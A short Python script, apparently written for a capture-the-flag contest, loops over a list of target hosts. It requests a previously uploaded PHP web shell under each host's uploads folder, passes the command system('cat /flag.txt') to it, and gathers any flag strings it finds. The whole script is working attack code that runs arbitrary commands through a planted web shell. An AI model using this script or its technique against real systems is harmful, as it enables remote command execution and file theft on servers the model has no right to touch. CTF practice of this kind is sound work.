from get_host import *
url = clear_url,http_url,https_url

import re,requests

payload1 = ''
payload2 = ''
payload3 = ''
payload4 = ''
payload5 = ''

flag_list = []

for i in url[1]:
    u = i + '/uploads/abc1/20220812/62f5bf4c374cd.php?1=system(%27cat%20/flag.txt%27);'
    html = requests.get(u)
    html.encoding = 'utf-8'
    if 'flag{' in html.text:
        flag_list.append(re.findall(r'flag{[0-9a-z-]+}',html.text))
print(flag_list)